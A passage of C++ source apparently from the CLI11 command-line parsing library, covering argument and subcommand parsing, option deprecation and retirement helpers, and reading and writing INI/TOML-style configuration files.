                    arg_name = narg_name;
                    value = nvalue;
                    rest.clear();
                    break;
                }
            }

            // don't capture missing if this is a nameless subcommand and nameless subcommands can't fallthrough
            if (parent_ != nullptr && name_.empty()) {
                return false;
            }

            // now check for '.' notation of subcommands
            auto dotloc = arg_name.find_first_of('.', 1);
            if (dotloc != std::string::npos) {
                // using dot notation is equivalent to single argument subcommand
                auto* sub = _find_subcommand(arg_name.substr(0, dotloc), true, false);
                if (sub != nullptr) {
                    std::string v = args.back();
                    args.pop_back();
                    arg_name = arg_name.substr(dotloc + 1);
                    if (arg_name.size() > 1) {
                        args.push_back(std::string("--") + v.substr(dotloc + 3));
                        current_type = detail::Classifier::LONG;
                    }
                    else {
                        auto nval = v.substr(dotloc + 2);
                        nval.front() = '-';
                        if (nval.size() > 2) {
                            // '=' not allowed in short form arguments
                            args.push_back(nval.substr(3));
                            nval.resize(2);
                        }
                        args.push_back(nval);
                        current_type = detail::Classifier::SHORT;
                    }
                    auto val = sub->_parse_arg(args, current_type, true);
                    if (val) {
                        if (!sub->silent_) {
                            parsed_subcommands_.push_back(sub);
                        }
                        // deal with preparsing
                        increment_parsed();
                        _trigger_pre_parse(args.size());
                        // run the parse complete callback since the subcommand processing is now complete
                        if (sub->parse_complete_callback_) {
                            sub->_process_env();
                            sub->_process_callbacks();
                            sub->_process_help_flags();
                            sub->_process_requirements();
                            sub->run_callback(false, true);
                        }
                        return true;
                    }
                    args.pop_back();
                    args.push_back(v);
                }
            }
            if (local_processing_only) {
                return false;
            }
            // If a subcommand, try the main command
            if (parent_ != nullptr && fallthrough_)
                return _get_fallthrough_parent()->_parse_arg(args, current_type, false);

            // Otherwise, add to missing
            args.pop_back();
            _move_to_missing(current_type, current);
            return true;
        }

        args.pop_back();

        // Get a reference to the pointer to make syntax bearable
        Option_p& op = *op_ptr;
        /// if we require a separator add it here
        if (op->get_inject_separator()) {
            if (!op->results().empty() && !op->results().back().empty()) {
                op->add_result(std::string{});
            }
        }
        if (op->get_trigger_on_parse() && op->current_option_state_ == Option::option_state::callback_run) {
            op->clear();
        }
        int min_num = (std::min)(op->get_type_size_min(), op->get_items_expected_min());
        int max_num = op->get_items_expected_max();
        // check container like options to limit the argument size to a single type if the allow_extra_flags argument is
        // set. 16 is somewhat arbitrary (needs to be at least 4)
        if (max_num >= detail::expected_max_vector_size / 16 && !op->get_allow_extra_args()) {
            auto tmax = op->get_type_size_max();
            max_num = detail::checked_multiply(tmax, op->get_expected_min()) ? tmax : detail::expected_max_vector_size;
        }
        // Make sure we always eat the minimum for unlimited vectors
        int collected = 0;     // total number of arguments collected
        int result_count = 0;  // local variable for number of results in a single arg string
        // deal with purely flag like things
        if (max_num == 0) {
            auto res = op->get_flag_value(arg_name, value);
            op->add_result(res);
            parse_order_.push_back(op.get());
        }
        else if (!value.empty()) {  // --this=value
            op->add_result(value, result_count);
            parse_order_.push_back(op.get());
            collected += result_count;
            // -Trest
        }
        else if (!rest.empty()) {
            op->add_result(rest, result_count);
            parse_order_.push_back(op.get());
            rest = "";
            collected += result_count;
        }

        // gather the minimum number of arguments
        while (min_num > collected && !args.empty()) {
            std::string current_ = args.back();
            args.pop_back();
            op->add_result(current_, result_count);
            parse_order_.push_back(op.get());
            collected += result_count;
        }

        if (min_num > collected) {  // if we have run out of arguments and the minimum was not met
            throw ArgumentMismatch::TypedAtLeast(op->get_name(), min_num, op->get_type_name());
        }

        // now check for optional arguments
        if (max_num > collected || op->get_allow_extra_args()) {  // we allow optional arguments
            auto remreqpos = _count_remaining_positionals(true);
            // we have met the minimum now optionally check up to the maximum
            while ((collected < max_num || op->get_allow_extra_args()) && !args.empty() &&
                _recognize(args.back(), false) == detail::Classifier::NONE) {
                // If any required positionals remain, don't keep eating
                if (remreqpos >= args.size()) {
                    break;
                }
                if (validate_optional_arguments_) {
                    std::string arg = args.back();
                    arg = op->_validate(arg, 0);
                    if (!arg.empty()) {
                        break;
                    }
                }
                op->add_result(args.back(), result_count);
                parse_order_.push_back(op.get());
                args.pop_back();
                collected += result_count;
            }

            // Allow -- to end an unlimited list and "eat" it
            if (!args.empty() && _recognize(args.back()) == detail::Classifier::POSITIONAL_MARK)
                args.pop_back();
            // optional flag that didn't receive anything now get the default value
            if (min_num == 0 && max_num > 0 && collected == 0) {
                auto res = op->get_flag_value(arg_name, std::string{});
                op->add_result(res);
                parse_order_.push_back(op.get());
            }
        }
        // if we only partially completed a type then add an empty string if allowed for later processing
        if (min_num > 0 && (collected % op->get_type_size_max()) != 0) {
            if (op->get_type_size_max() != op->get_type_size_min()) {
                op->add_result(std::string{});
            }
            else {
                throw ArgumentMismatch::PartialType(op->get_name(), op->get_type_size_min(), op->get_type_name());
            }
        }
        if (op->get_trigger_on_parse()) {
            op->run_callback();
        }
        if (!rest.empty()) {
            rest = "-" + rest;
            args.push_back(rest);
        }
        return true;
    }

    CLI11_INLINE void App::_trigger_pre_parse(std::size_t remaining_args) {
        if (!pre_parse_called_) {
            pre_parse_called_ = true;
            if (pre_parse_callback_) {
                pre_parse_callback_(remaining_args);
            }
        }
        else if (immediate_callback_) {
            if (!name_.empty()) {
                auto pcnt = parsed_;
                missing_t extras = std::move(missing_);
                clear();
                parsed_ = pcnt;
                pre_parse_called_ = true;
                missing_ = std::move(extras);
            }
        }
    }

    CLI11_INLINE App* App::_get_fallthrough_parent() {
        if (parent_ == nullptr) {
            throw(HorribleError("No Valid parent"));
        }
        auto* fallthrough_parent = parent_;
        while ((fallthrough_parent->parent_ != nullptr) && (fallthrough_parent->get_name().empty())) {
            fallthrough_parent = fallthrough_parent->parent_;
        }
        return fallthrough_parent;
    }

    CLI11_NODISCARD CLI11_INLINE const std::string& App::_compare_subcommand_names(const App& subcom,
        const App& base) const {
        static const std::string estring;
        if (subcom.disabled_) {
            return estring;
        }
        for (const auto& subc : base.subcommands_) {
            if (subc.get() != &subcom) {
                if (subc->disabled_) {
                    continue;
                }
                if (!subcom.get_name().empty()) {
                    if (subc->check_name(subcom.get_name())) {
                        return subcom.get_name();
                    }
                }
                if (!subc->get_name().empty()) {
                    if (subcom.check_name(subc->get_name())) {
                        return subc->get_name();
                    }
                }
                for (const auto& les : subcom.aliases_) {
                    if (subc->check_name(les)) {
                        return les;
                    }
                }
                // this loop is needed in case of ignore_underscore or ignore_case on one but not the other
                for (const auto& les : subc->aliases_) {
                    if (subcom.check_name(les)) {
                        return les;
                    }
                }
                // if the subcommand is an option group we need to check deeper
                if (subc->get_name().empty()) {
                    const auto& cmpres = _compare_subcommand_names(subcom, *subc);
                    if (!cmpres.empty()) {
                        return cmpres;
                    }
                }
                // if the test subcommand is an option group we need to check deeper
                if (subcom.get_name().empty()) {
                    const auto& cmpres = _compare_subcommand_names(*subc, subcom);
                    if (!cmpres.empty()) {
                        return cmpres;
                    }
                }
            }
        }
        return estring;
    }

    CLI11_INLINE void App::_move_to_missing(detail::Classifier val_type, const std::string& val) {
        if (allow_extras_ || subcommands_.empty()) {
            missing_.emplace_back(val_type, val);
            return;
        }
        // allow extra arguments to be places in an option group if it is allowed there
        for (auto& subc : subcommands_) {
            if (subc->name_.empty() && subc->allow_extras_) {
                subc->missing_.emplace_back(val_type, val);
                return;
            }
        }
        // if we haven't found any place to put them yet put them in missing
        missing_.emplace_back(val_type, val);
    }

    CLI11_INLINE void App::_move_option(Option* opt, App* app) {
        if (opt == nullptr) {
            throw OptionNotFound("the option is NULL");
        }
        // verify that the give app is actually a subcommand
        bool found = false;
        for (auto& subc : subcommands_) {
            if (app == subc.get()) {
                found = true;
            }
        }
        if (!found) {
            throw OptionNotFound("The Given app is not a subcommand");
        }

        if ((help_ptr_ == opt) || (help_all_ptr_ == opt))
            throw OptionAlreadyAdded("cannot move help options");

        if (config_ptr_ == opt)
            throw OptionAlreadyAdded("cannot move config file options");

        auto iterator =
            std::find_if(std::begin(options_), std::end(options_), [opt](const Option_p& v) { return v.get() == opt; });
        if (iterator != std::end(options_)) {
            const auto& opt_p = *iterator;
            if (std::find_if(std::begin(app->options_), std::end(app->options_), [&opt_p](const Option_p& v) {
                return (*v == *opt_p);
                }) == std::end(app->options_)) {
                // only erase after the insertion was successful
                app->options_.push_back(std::move(*iterator));
                options_.erase(iterator);
            }
            else {
                throw OptionAlreadyAdded("option was not located: " + opt->get_name());
            }
        }
        else {
            throw OptionNotFound("could not locate the given Option");
        }
    }

    CLI11_INLINE void TriggerOn(App* trigger_app, App* app_to_enable) {
        app_to_enable->enabled_by_default(false);
        app_to_enable->disabled_by_default();
        trigger_app->preparse_callback([app_to_enable](std::size_t) { app_to_enable->disabled(false); });
    }

    CLI11_INLINE void TriggerOn(App* trigger_app, std::vector<App*> apps_to_enable) {
        for (auto& app : apps_to_enable) {
            app->enabled_by_default(false);
            app->disabled_by_default();
        }

        trigger_app->preparse_callback([apps_to_enable](std::size_t) {
            for (const auto& app : apps_to_enable) {
                app->disabled(false);
            }
            });
    }

    CLI11_INLINE void TriggerOff(App* trigger_app, App* app_to_enable) {
        app_to_enable->disabled_by_default(false);
        app_to_enable->enabled_by_default();
        trigger_app->preparse_callback([app_to_enable](std::size_t) { app_to_enable->disabled(); });
    }

    CLI11_INLINE void TriggerOff(App* trigger_app, std::vector<App*> apps_to_enable) {
        for (auto& app : apps_to_enable) {
            app->disabled_by_default(false);
            app->enabled_by_default();
        }

        trigger_app->preparse_callback([apps_to_enable](std::size_t) {
            for (const auto& app : apps_to_enable) {
                app->disabled();
            }
            });
    }

    CLI11_INLINE void deprecate_option(Option* opt, const std::string& replacement) {
        Validator deprecate_warning{ [opt, replacement](std::string&) {
                                        std::cout << opt->get_name() << " is deprecated please use '" << replacement
                                                  << "' instead\n";
                                        return std::string();
                                    },
                                    "DEPRECATED" };
        deprecate_warning.application_index(0);
        opt->check(deprecate_warning);
        if (!replacement.empty()) {
            opt->description(opt->get_description() + " DEPRECATED: please use '" + replacement + "' instead");
        }
    }

    CLI11_INLINE void retire_option(App* app, Option* opt) {
        App temp;
        auto* option_copy = temp.add_option(opt->get_name(false, true))
            ->type_size(opt->get_type_size_min(), opt->get_type_size_max())
            ->expected(opt->get_expected_min(), opt->get_expected_max())
            ->allow_extra_args(opt->get_allow_extra_args());

        app->remove_option(opt);
        auto* opt2 = app->add_option(option_copy->get_name(false, true), "option has been retired and has no effect");
        opt2->type_name("RETIRED")
            ->default_str("RETIRED")
            ->type_size(option_copy->get_type_size_min(), option_copy->get_type_size_max())
            ->expected(option_copy->get_expected_min(), option_copy->get_expected_max())
            ->allow_extra_args(option_copy->get_allow_extra_args());

        // LCOV_EXCL_START
        // something odd with coverage on new compilers
        Validator retired_warning{ [opt2](std::string&) {
                                      std::cout << "WARNING " << opt2->get_name() << " is retired and has no effect\n";
                                      return std::string();
                                  },
                                  "" };
        // LCOV_EXCL_STOP
        retired_warning.application_index(0);
        opt2->check(retired_warning);
    }

    CLI11_INLINE void retire_option(App& app, Option* opt) { retire_option(&app, opt); }

    CLI11_INLINE void retire_option(App* app, const std::string& option_name) {

        auto* opt = app->get_option_no_throw(option_name);
        if (opt != nullptr) {
            retire_option(app, opt);
            return;
        }
        auto* opt2 = app->add_option(option_name, "option has been retired and has no effect")
            ->type_name("RETIRED")
            ->expected(0, 1)
            ->default_str("RETIRED");
        // LCOV_EXCL_START
        // something odd with coverage on new compilers
        Validator retired_warning{ [opt2](std::string&) {
                                      std::cout << "WARNING " << opt2->get_name() << " is retired and has no effect\n";
                                      return std::string();
                                  },
                                  "" };
        // LCOV_EXCL_STOP
        retired_warning.application_index(0);
        opt2->check(retired_warning);
    }

    CLI11_INLINE void retire_option(App& app, const std::string& option_name) { retire_option(&app, option_name); }

    namespace FailureMessage {

        CLI11_INLINE std::string simple(const App* app, const Error& e) {
            std::string header = std::string(e.what()) + "\n";
            std::vector<std::string> names;

            // Collect names
            if (app->get_help_ptr() != nullptr)
                names.push_back(app->get_help_ptr()->get_name());

            if (app->get_help_all_ptr() != nullptr)
                names.push_back(app->get_help_all_ptr()->get_name());

            // If any names found, suggest those
            if (!names.empty())
                header += "Run with " + detail::join(names, " or ") + " for more information.\n";

            return header;
        }

        CLI11_INLINE std::string help(const App* app, const Error& e) {
            std::string header = std::string("ERROR: ") + e.get_name() + ": " + e.what() + "\n";
            header += app->help();
            return header;
        }

    }  // namespace FailureMessage




    namespace detail {

        std::string convert_arg_for_ini(const std::string& arg,
            char stringQuote = '"',
            char literalQuote = '\'',
            bool disable_multi_line = false);

        /// Comma separated join, adds quotes if needed
        std::string ini_join(const std::vector<std::string>& args,
            char sepChar = ',',
            char arrayStart = '[',
            char arrayEnd = ']',
            char stringQuote = '"',
            char literalQuote = '\'');

        void clean_name_string(std::string& name, const std::string& keyChars);

        std::vector<std::string> generate_parents(const std::string& section, std::string& name, char parentSeparator);

        /// assuming non default segments do a check on the close and open of the segments in a configItem structure
        void checkParentSegments(std::vector<ConfigItem>& output, const std::string& currentSection, char parentSeparator);
    }  // namespace detail




    static constexpr auto multiline_literal_quote = R"(''')";
    static constexpr auto multiline_string_quote = R"(""")";

    namespace detail {

        CLI11_INLINE bool is_printable(const std::string& test_string) {
            return std::all_of(test_string.begin(), test_string.end(), [](char x) {
                return (isprint(static_cast<unsigned char>(x)) != 0 || x == '\n' || x == '\t');
                });
        }

        CLI11_INLINE std::string
            convert_arg_for_ini(const std::string& arg, char stringQuote, char literalQuote, bool disable_multi_line) {
            if (arg.empty()) {
                return std::string(2, stringQuote);
            }
            // some specifically supported strings
            if (arg == "true" || arg == "false" || arg == "nan" || arg == "inf") {
                return arg;
            }
            // floating point conversion can convert some hex codes, but don't try that here
            if (arg.compare(0, 2, "0x") != 0 && arg.compare(0, 2, "0X") != 0) {
                using CLI::detail::lexical_cast;
                double val = 0.0;
                if (lexical_cast(arg, val)) {
                    if (arg.find_first_not_of("0123456789.-+eE") == std::string::npos) {
                        return arg;
                    }
                }
            }
            // just quote a single non numeric character
            if (arg.size() == 1) {
                if (isprint(static_cast<unsigned char>(arg.front())) == 0) {
                    return binary_escape_string(arg);
                }
                if (arg == "'") {
                    return std::string(1, stringQuote) + "'" + stringQuote;
                }
                return std::string(1, literalQuote) + arg + literalQuote;
            }
            // handle hex, binary or octal arguments
            if (arg.front() == '0') {
                if (arg[1] == 'x') {
                    if (std::all_of(arg.begin() + 2, arg.end(), [](char x) {
                        return (x >= '0' && x <= '9') || (x >= 'A' && x <= 'F') || (x >= 'a' && x <= 'f');
                        })) {
                        return arg;
                    }
                }
                else if (arg[1] == 'o') {
                    if (std::all_of(arg.begin() + 2, arg.end(), [](char x) { return (x >= '0' && x <= '7'); })) {
                        return arg;
                    }
                }
                else if (arg[1] == 'b') {
                    if (std::all_of(arg.begin() + 2, arg.end(), [](char x) { return (x == '0' || x == '1'); })) {
                        return arg;
                    }
                }
            }
            if (!is_printable(arg)) {
                return binary_escape_string(arg);
            }
            if (detail::has_escapable_character(arg)) {
                if (arg.size() > 100 && !disable_multi_line) {
                    return std::string(multiline_literal_quote) + arg + multiline_literal_quote;
                }
                return std::string(1, stringQuote) + detail::add_escaped_characters(arg) + stringQuote;
            }
            return std::string(1, stringQuote) + arg + stringQuote;
        }

        CLI11_INLINE std::string ini_join(const std::vector<std::string>& args,
            char sepChar,
            char arrayStart,
            char arrayEnd,
            char stringQuote,
            char literalQuote) {
            bool disable_multi_line{ false };
            std::string joined;
            if (args.size() > 1 && arrayStart != '\0') {
                joined.push_back(arrayStart);
                disable_multi_line = true;
            }
            std::size_t start = 0;
            for (const auto& arg : args) {
                if (start++ > 0) {
                    joined.push_back(sepChar);
                    if (!std::isspace<char>(sepChar, std::locale())) {
                        joined.push_back(' ');
                    }
                }
                joined.append(convert_arg_for_ini(arg, stringQuote, literalQuote, disable_multi_line));
            }
            if (args.size() > 1 && arrayEnd != '\0') {
                joined.push_back(arrayEnd);
            }
            return joined;
        }

        CLI11_INLINE std::vector<std::string>
            generate_parents(const std::string& section, std::string& name, char parentSeparator) {
            std::vector<std::string> parents;
            if (detail::to_lower(section) != "default") {
                if (section.find(parentSeparator) != std::string::npos) {
                    parents = detail::split_up(section, parentSeparator);
                }
                else {
                    parents = { section };
                }
            }
            if (name.find(parentSeparator) != std::string::npos) {
                std::vector<std::string> plist = detail::split_up(name, parentSeparator);
                name = plist.back();
                plist.pop_back();
                parents.insert(parents.end(), plist.begin(), plist.end());
            }
            // clean up quotes on the parents
            try {
                detail::remove_quotes(parents);
            }
            catch (const std::invalid_argument& iarg) {
                throw CLI::ParseError(iarg.what(), CLI::ExitCodes::InvalidError);
            }
            return parents;
        }

        CLI11_INLINE void
            checkParentSegments(std::vector<ConfigItem>& output, const std::string& currentSection, char parentSeparator) {

            std::string estring;
            auto parents = detail::generate_parents(currentSection, estring, parentSeparator);
            if (!output.empty() && output.back().name == "--") {
                std::size_t msize = (parents.size() > 1U) ? parents.size() : 2;
                while (output.back().parents.size() >= msize) {
                    output.push_back(output.back());
                    output.back().parents.pop_back();
                }

                if (parents.size() > 1) {
                    std::size_t common = 0;
                    std::size_t mpair = (std::min)(output.back().parents.size(), parents.size() - 1);
                    for (std::size_t ii = 0; ii < mpair; ++ii) {
                        if (output.back().parents[ii] != parents[ii]) {
                            break;
                        }
                        ++common;
                    }
                    if (common == mpair) {
                        output.pop_back();
                    }
                    else {
                        while (output.back().parents.size() > common + 1) {
                            output.push_back(output.back());
                            output.back().parents.pop_back();
                        }
                    }
                    for (std::size_t ii = common; ii < parents.size() - 1; ++ii) {
                        output.emplace_back();
                        output.back().parents.assign(parents.begin(), parents.begin() + static_cast<std::ptrdiff_t>(ii) + 1);
                        output.back().name = "++";
                    }
                }
            }
            else if (parents.size() > 1) {
                for (std::size_t ii = 0; ii < parents.size() - 1; ++ii) {
                    output.emplace_back();
                    output.back().parents.assign(parents.begin(), parents.begin() + static_cast<std::ptrdiff_t>(ii) + 1);
                    output.back().name = "++";
                }
            }

            // insert a section end which is just an empty items_buffer
            output.emplace_back();
            output.back().parents = std::move(parents);
            output.back().name = "++";
        }

        /// @brief  checks if a string represents a multiline comment
        CLI11_INLINE bool hasMLString(std::string const& fullString, char check) {
            if (fullString.length() < 3) {
                return false;
            }
            auto it = fullString.rbegin();
            return (*it == check) && (*(it + 1) == check) && (*(it + 2) == check);
        }

        /// @brief  find a matching configItem in a list
        inline auto find_matching_config(std::vector<ConfigItem>& items,
            const std::vector<std::string>& parents,
            const std::string& name,
            bool fullSearch) -> decltype(items.begin()) {
            if (items.empty()) {
                return items.end();
            }
            auto search = items.end() - 1;
            do {
                if (search->parents == parents && search->name == name) {
                    return search;
                }
                if (search == items.begin()) {
                    break;
                }
                --search;
            } while (fullSearch);
            return items.end();
        }
    }  // namespace detail

    inline std::vector<ConfigItem> ConfigBase::from_config(std::istream& input) const {
        std::string line;
        std::string buffer;
        std::string currentSection = "default";
        std::string previousSection = "default";
        std::vector<ConfigItem> output;
        bool isDefaultArray = (arrayStart == '[' && arrayEnd == ']' && arraySeparator == ',');
        bool isINIArray = (arrayStart == '\0' || arrayStart == ' ') && arrayStart == arrayEnd;
        bool inSection{ false };
        bool inMLineComment{ false };
        bool inMLineValue{ false };

        char aStart = (isINIArray) ? '[' : arrayStart;
        char aEnd = (isINIArray) ? ']' : arrayEnd;
        char aSep = (isINIArray && arraySeparator == ' ') ? ',' : arraySeparator;
        int currentSectionIndex{ 0 };

        std::string line_sep_chars{ parentSeparatorChar, commentChar, valueDelimiter };
        while (getline(input, buffer)) {
            std::vector<std::string> items_buffer;
            std::string name;
            line = detail::trim_copy(buffer);
            std::size_t len = line.length();
            // lines have to be at least 3 characters to have any meaning to CLI just skip the rest
            if (len < 3) {
                continue;
            }
            if (line.compare(0, 3, multiline_string_quote) == 0 || line.compare(0, 3, multiline_literal_quote) == 0) {
                inMLineComment = true;
                auto cchar = line.front();
                while (inMLineComment) {
                    if (getline(input, line)) {
                        detail::trim(line);
                    }
                    else {
                        break;
                    }
                    if (detail::hasMLString(line, cchar)) {
                        inMLineComment = false;
                    }
                }
                continue;
            }
            if (line.front() == '[' && line.back() == ']') {
                if (currentSection != "default") {
                    // insert a section end which is just an empty items_buffer
                    output.emplace_back();
                    output.back().parents = detail::generate_parents(currentSection, name, parentSeparatorChar);
                    output.back().name = "--";
                }
                currentSection = line.substr(1, len - 2);
                // deal with double brackets for TOML
                if (currentSection.size() > 1 && currentSection.front() == '[' && currentSection.back() == ']') {
                    currentSection = currentSection.substr(1, currentSection.size() - 2);
                }
                if (detail::to_lower(currentSection) == "default") {
                    currentSection = "default";
                }
                else {
                    detail::checkParentSegments(output, currentSection, parentSeparatorChar);
                }
                inSection = false;
                if (currentSection == previousSection) {
                    ++currentSectionIndex;
                }
                else {
                    currentSectionIndex = 0;
                    previousSection = currentSection;
                }
                continue;
            }

            // comment lines
            if (line.front() == ';' || line.front() == '#' || line.front() == commentChar) {
                continue;
            }
            std::size_t search_start = 0;
            if (line.find_first_of("\"'`") != std::string::npos) {
                while (search_start < line.size()) {
                    auto test_char = line[search_start];
                    if (test_char == '\"' || test_char == '\'' || test_char == '`') {
                        search_start = detail::close_sequence(line, search_start, line[search_start]);
                        ++search_start;
                    }
                    else if (test_char == valueDelimiter || test_char == commentChar) {
                        --search_start;
                        break;
                    }
                    else if (test_char == ' ' || test_char == '\t' || test_char == parentSeparatorChar) {
                        ++search_start;
                    }
                    else {
                        search_start = line.find_first_of(line_sep_chars, search_start);
                    }
                }
            }
            // Find = in string, split and recombine
            auto delimiter_pos = line.find_first_of(valueDelimiter, search_start + 1);
            auto comment_pos = line.find_first_of(commentChar, search_start);
            if (comment_pos < delimiter_pos) {
                delimiter_pos = std::string::npos;
            }
            if (delimiter_pos != std::string::npos) {

                name = detail::trim_copy(line.substr(0, delimiter_pos));
                std::string item = detail::trim_copy(line.substr(delimiter_pos + 1, std::string::npos));
                bool mlquote =
                    (item.compare(0, 3, multiline_literal_quote) == 0 || item.compare(0, 3, multiline_string_quote) == 0);
                if (!mlquote && comment_pos != std::string::npos) {
                    auto citems = detail::split_up(item, commentChar);
                    item = detail::trim_copy(citems.front());
                }
                if (mlquote) {
                    // multiline string
                    auto keyChar = item.front();
                    item = buffer.substr(delimiter_pos + 1, std::string::npos);
                    detail::ltrim(item);
                    item.erase(0, 3);
                    inMLineValue = true;
                    bool lineExtension{ false };
                    bool firstLine = true;
                    if (!item.empty() && item.back() == '\\') {
                        item.pop_back();
                        lineExtension = true;
                    }
                    else if (detail::hasMLString(item, keyChar)) {
                        // deal with the first line closing the multiline literal
                        item.pop_back();
                        item.pop_back();
                        item.pop_back();
                        if (keyChar == '\"') {
                            try {
                                item = detail::remove_escaped_characters(item);
                            }
                            catch (const std::invalid_argument& iarg) {
                                throw CLI::ParseError(iarg.what(), CLI::ExitCodes::InvalidError);
                            }
                        }
                        inMLineValue = false;
                    }
                    while (inMLineValue) {
                        std::string l2;
                        if (!std::getline(input, l2)) {
                            break;
                        }
                        line = l2;
                        detail::rtrim(line);
                        if (detail::hasMLString(line, keyChar)) {
                            line.pop_back();
                            line.pop_back();
                            line.pop_back();
                            if (lineExtension) {
                                detail::ltrim(line);
                            }
                            else if (!(firstLine && item.empty())) {
                                item.push_back('\n');
                            }
                            firstLine = false;
                            item += line;
                            inMLineValue = false;
                            if (!item.empty() && item.back() == '\n') {
                                item.pop_back();
                            }
                            if (keyChar == '\"') {
                                try {
                                    item = detail::remove_escaped_characters(item);
                                }
                                catch (const std::invalid_argument& iarg) {
                                    throw CLI::ParseError(iarg.what(), CLI::ExitCodes::InvalidError);
                                }
                            }
                        }
                        else {
                            if (lineExtension) {
                                detail::trim(l2);
                            }
                            else if (!(firstLine && item.empty())) {
                                item.push_back('\n');
                            }
                            lineExtension = false;
                            firstLine = false;
                            if (!l2.empty() && l2.back() == '\\') {
                                lineExtension = true;
                                l2.pop_back();
                            }
                            item += l2;
                        }
                    }
                    items_buffer = { item };
                }
                else if (item.size() > 1 && item.front() == aStart) {
                    for (std::string multiline; item.back() != aEnd && std::getline(input, multiline);) {
                        detail::trim(multiline);
                        item += multiline;
                    }
                    if (item.back() == aEnd) {
                        items_buffer = detail::split_up(item.substr(1, item.length() - 2), aSep);
                    }
                    else {
                        items_buffer = detail::split_up(item.substr(1, std::string::npos), aSep);
                    }
                }
                else if ((isDefaultArray || isINIArray) && item.find_first_of(aSep) != std::string::npos) {
                    items_buffer = detail::split_up(item, aSep);
                }
                else if ((isDefaultArray || isINIArray) && item.find_first_of(' ') != std::string::npos) {
                    items_buffer = detail::split_up(item, '\0');
                }
                else {
                    items_buffer = { item };
                }
            }
            else {
                name = detail::trim_copy(line.substr(0, comment_pos));
                items_buffer = { "true" };
            }
            std::vector<std::string> parents;
            try {
                parents = detail::generate_parents(currentSection, name, parentSeparatorChar);
                detail::process_quoted_string(name);
                // clean up quotes on the items and check for escaped strings
                for (auto& it : items_buffer) {
                    detail::process_quoted_string(it, stringQuote, literalQuote);
                }
            }
            catch (const std::invalid_argument& ia) {
                throw CLI::ParseError(ia.what(), CLI::ExitCodes::InvalidError);
            }

            if (parents.size() > maximumLayers) {
                continue;
            }
            if (!configSection.empty() && !inSection) {
                if (parents.empty() || parents.front() != configSection) {
                    continue;
                }
                if (configIndex >= 0 && currentSectionIndex != configIndex) {
                    continue;
                }
                parents.erase(parents.begin());
                inSection = true;
            }
            auto match = detail::find_matching_config(output, parents, name, allowMultipleDuplicateFields);
            if (match != output.end()) {
                if ((match->inputs.size() > 1 && items_buffer.size() > 1) || allowMultipleDuplicateFields) {
                    // insert a separator if one is not already present
                    if (!(match->inputs.back().empty() || items_buffer.front().empty() || match->inputs.back() == "%%" ||
                        items_buffer.front() == "%%")) {
                        match->inputs.emplace_back("%%");
                        match->multiline = true;
                    }
                }
                match->inputs.insert(match->inputs.end(), items_buffer.begin(), items_buffer.end());
            }
            else {
                output.emplace_back();
                output.back().parents = std::move(parents);
                output.back().name = std::move(name);
                output.back().inputs = std::move(items_buffer);
            }
        }
        if (currentSection != "default") {
            // insert a section end which is just an empty items_buffer
            std::string ename;
            output.emplace_back();
            output.back().parents = detail::generate_parents(currentSection, ename, parentSeparatorChar);
            output.back().name = "--";
            while (output.back().parents.size() > 1) {
                output.push_back(output.back());
                output.back().parents.pop_back();
            }
        }
        return output;
    }

    CLI11_INLINE std::string& clean_name_string(std::string& name, const std::string& keyChars) {
        if (name.find_first_of(keyChars) != std::string::npos || (name.front() == '[' && name.back() == ']') ||
            (name.find_first_of("'`\"\\") != std::string::npos)) {
            if (name.find_first_of('\'') == std::string::npos) {
                name.insert(0, 1, '\'');
                name.push_back('\'');
            }
            else {
                if (detail::has_escapable_character(name)) {
                    name = detail::add_escaped_characters(name);
                }
                name.insert(0, 1, '\"');
                name.push_back('\"');
            }
        }
        return name;
    }

    CLI11_INLINE std::string
        ConfigBase::to_config(const App* app, bool default_also, bool write_description, std::string prefix) const {
        std::stringstream out;
        std::string commentLead;
        commentLead.push_back(commentChar);
        commentLead.push_back(' ');

        std::string commentTest = "#;";
        commentTest.push_back(commentChar);
        commentTest.push_back(parentSeparatorChar);

        std::string keyChars = commentTest;
        keyChars.push_back(literalQuote);
        keyChars.push_back(stringQuote);
        keyChars.push_back(arrayStart);
        keyChars.push_back(arrayEnd);
        keyChars.push_back(valueDelimiter);
        keyChars.push_back(arraySeparator);

        std::vector<std::string> groups = app->get_groups();
        bool defaultUsed = false;
        groups.insert(groups.begin(), std::string("OPTIONS"));

        for (auto& group : groups) {
            if (group == "OPTIONS" || group.empty()) {
                if (defaultUsed) {
                    continue;
                }
                defaultUsed = true;
            }
            if (write_description && group != "OPTIONS" && !group.empty()) {
                out << '\n' << commentChar << commentLead << group << " Options\n";
            }
            for (const Option* opt : app->get_options({})) {
                // Only process options that are configurable
                if (opt->get_configurable()) {
                    if (opt->get_group() != group) {
                        if (!(group == "OPTIONS" && opt->get_group().empty())) {
                            continue;
                        }
                    }
                    std::string single_name = opt->get_single_name();
                    if (single_name.empty()) {
                        continue;
                    }

                    auto results = opt->reduced_results();
                    std::string value =
                        detail::ini_join(results, arraySeparator, arrayStart, arrayEnd, stringQuote, literalQuote);

                    bool isDefault = false;
                    if (value.empty() && default_also) {
                        if (!opt->get_default_str().empty()) {
                            value = detail::convert_arg_for_ini(opt->get_default_str(), stringQuote, literalQuote, false);
                        }
                        else if (opt->get_expected_min() == 0) {
                            value = "false";
                        }
                        else if (opt->get_run_callback_for_default() || !opt->get_required()) {
                            value = "\"\"";  // empty string default value
                        }
                        else {
                            value = "\"<REQUIRED>\"";
                        }
                        isDefault = true;
                    }

                    if (!value.empty()) {
                        if (!opt->get_fnames().empty()) {
                            try {
                                value = opt->get_flag_value(single_name, value);
                            }
                            catch (const CLI::ArgumentMismatch&) {
                                bool valid{ false };
                                for (const auto& test_name : opt->get_fnames()) {
                                    try {
                                        value = opt->get_flag_value(test_name, value);
                                        single_name = test_name;
                                        valid = true;
                                    }
                                    catch (const CLI::ArgumentMismatch&) {
                                        continue;
                                    }
                                }
                                if (!valid) {
                                    value = detail::ini_join(
                                        opt->results(), arraySeparator, arrayStart, arrayEnd, stringQuote, literalQuote);
                                }
                            }
                        }
                        if (write_description && opt->has_description()) {
                            if (out.tellp() != std::streampos(0)) {
                                out << '\n';
                            }
                            out << commentLead << detail::fix_newlines(commentLead, opt->get_description()) << '\n';
                        }
                        clean_name_string(single_name, keyChars);

                        std::string name = prefix + single_name;
                        if (commentDefaultsBool && isDefault) {
                            name = commentChar + name;
                        }
                        out << name << valueDelimiter << value << '\n';
                    }
                }
            }
        }

        auto subcommands = app->get_subcommands({});
        for (const App* subcom : subcommands) {
            if (subcom->get_name().empty()) {
                if (!default_also && (subcom->count_all() == 0)) {
                    continue;
                }
                if (write_description && !subcom->get_group().empty()) {
